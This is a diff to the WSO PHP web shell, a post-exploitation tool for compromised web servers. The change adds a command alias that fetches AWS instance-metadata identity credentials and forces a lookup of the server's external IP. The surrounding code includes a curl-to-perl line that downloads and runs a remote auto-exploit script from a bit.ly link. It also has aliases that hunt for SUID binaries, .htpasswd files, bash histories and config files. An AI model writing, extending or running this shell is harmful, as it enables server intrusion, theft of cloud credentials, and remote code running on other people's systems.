@@ -76,7 +76,7 @@ try {
 		</span>' : '';
 		$filename = preg_match('/FilesTools/', @$_POST['a']) && @$_POST['p1'] ? htmlspecialchars(@basename($_POST['p1'])) : '';
 		$filename = $filename ? "<a href=javascript:g('FilesTools',null,'" . $filename . "','" . (is_writable($_POST['p1']) ? 'edit' : 'view') . "') style='color:" . wsoPermsColorOnly($_POST['p1']) . "' >" . $filename . "</a>" : '';
-		$console = " <input class='toolsInp hoverable' type=text name=path placeholder='[ edit path ]' tabindex='0'>";
+		$console = " <input class='toolsInp hoverable' type=text name=path placeholder='[ change path/file ]' tabindex='0'>";
 		echo '<h1>' . $buttons . ' <form onsubmit="g(\'FilesMan\',this.path.value);return false;"><a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\');return false;">[ cwd ]</a> ' . $cwd_links . $filename . $console . '</form></h1>';
 	}
 	// todo: https://antichat.com/threads/470018/
@@ -208,7 +208,7 @@ try {
 	if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax;
 
 	if ($os == 'win') $aliases = array("List Directory" => "dir", "Find index.php in current dir" => "dir /s /w /b index.php", "Find *config*.php in current dir" => "dir /s /w /b *config*.php", "Show active connections" => "netstat -an", "Show running services" => "net start", "User accounts" => "net user", "Show computers" => "net view", "ARP Table" => "arp -a", "IP Configuration" => "ipconfig /all");
-	else $aliases = array("List dir" => "ls -lha", "list file attributes on a Linux second extended file system" => "lsattr -va", "show opened ports" => "netstat -an | grep -i listen", "process status" => "ps aux", "Find" => "", "find all suid files" => "find / -type f -perm -04000 -ls", "find suid files in current dir" => "find . -type f -perm -04000 -ls", "find all sgid files" => "find / -type f -perm -02000 -ls", "find sgid files in current dir" => "find . -type f -perm -02000 -ls", "find config.inc.php files" => "find / -type f -name config.inc.php", "find config* files" => "find / -type f -name \"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");
+	else $aliases = array("Fetch AWS metadata" => "curl -Ss http://169.254.169.254/latest/meta-data/identity-credentials/", "List dir" => "ls -lha", "list file attributes on a Linux second extended file system" => "lsattr -va", "show opened ports" => "netstat -an | grep -i listen", "process status" => "ps aux", "Find" => "", "find all suid files" => "find / -type f -perm -04000 -ls", "find suid files in current dir" => "find . -type f -perm -04000 -ls", "find all sgid files" => "find / -type f -perm -02000 -ls", "find sgid files in current dir" => "find . -type f -perm -02000 -ls", "find config.inc.php files" => "find / -type f -name config.inc.php", "find config* files" => "find / -type f -name \"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");
 	
 	function wsoHeader() {
 		$_POST['charset'] = $GLOBALS['default_charset'];
@@ -218,13 +218,10 @@ try {
 		global $chains_bypassed;
 		echo "<html><head>
 		<link href='//cdn.jsdelivr.net/npm/bootstrap/dist/css/bootstrap.min.css' rel='stylesheet'>
-		<link href='//cdn.jsdelivr.net/gh/aels/textarea/textarea.min.css' rel='stylesheet'>
-		<link href='//highlightjs.org/static/demo/styles/base16/decaf.css' rel='stylesheet'>
 		<script src='//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js'></script>
 		<script src='//cdn.jsdelivr.net/npm/bootstrap/dist/js/bootstrap.bundle.min.js'></script>
-		<script src='//cdn.jsdelivr.net/gh/aels/textarea/textarea.min.js'></script>
-		<script src='//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js'></script>
-		<meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . WSO_VERSION . "</title>
+		<meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'>
+		<title>" . $_SERVER['HTTP_HOST'] . " - WSO " . WSO_VERSION . "</title>
 	<style>
 	@import url('https://fonts.googleapis.com/css2?family=Outfit&family=Teko:wght@300&display=swap');
 	:root {
@@ -324,7 +321,7 @@ try {
 		$kernel = @php_uname('s');
 		$explink = 'curl -fskSL bit.ly/autoexp2 > /tmp/auto.pl; perl /tmp/auto.pl; rm -f /tmp/auto.pl;';
 		$sectrailslink = 'https://securitytrails.com/_next/data/85323275/list/ip/';
-		$_SERVER["SERVER_ADDR"] = preg_match('/127\.0\.0\.1|localhost/', $_SERVER["SERVER_ADDR"])?wsoGetFile('https://api.my-ip.io/ip'):$_SERVER["SERVER_ADDR"];
+		$_SERVER["SERVER_ADDR"] = wsoGetFile('https://api.my-ip.io/ip');
 		$vt_detections = preg_replace('/^(.*"response_code": ?)(\d+)(, ?".*)|(.+"positives": )(\d{1,2})(, "total.+)$/', '$2$5', wsoGetFile('https://www.virustotal.com/vtapi/v2/url/report?resource=' . $_SERVER["SERVER_ADDR"] . '&apikey=' . $vt_key));
 		$vt_detections = $vt_detections != 0 ? '<b class=text-danger>' . $vt_detections . '</b>' : $vt_detections;
 		$ip_data = preg_replace('/(.+"countryCode":")([A-Z]{2})(",".+"isp":")(.+)(","org".+)|(.*"message":")(.+)(","query")(.*)/si', '$2$7, $4', wsoGetFile('http://demo.ip-api.com/json/' . $_SERVER["SERVER_ADDR"] . '?fields=66842623&lang=en'));
@@ -358,6 +355,7 @@ try {
 	function wsoFooter() {
 		echo "
 					</div>
+				<script src='//aels.github.io/textarea-editor/textarea-editor.js'></script>
 				<script>
 					Clipboard = function(){ var a;return{copy:function(b){a=document.createElement('textArea');a.value=b;document.body.appendChild(a);if(navigator.userAgent.match(/ipad|iphone/i)){b=document.createRange();b.selectNodeContents(a);var c=window.getSelection();c.removeAllRanges();c.addRange(b);a.setSelectionRange(0,999999)}else a.select();document.execCommand('copy');document.body.removeChild(a)}} }();
 					document.querySelectorAll('.copy').forEach(function(a){ a.onclick = function() {
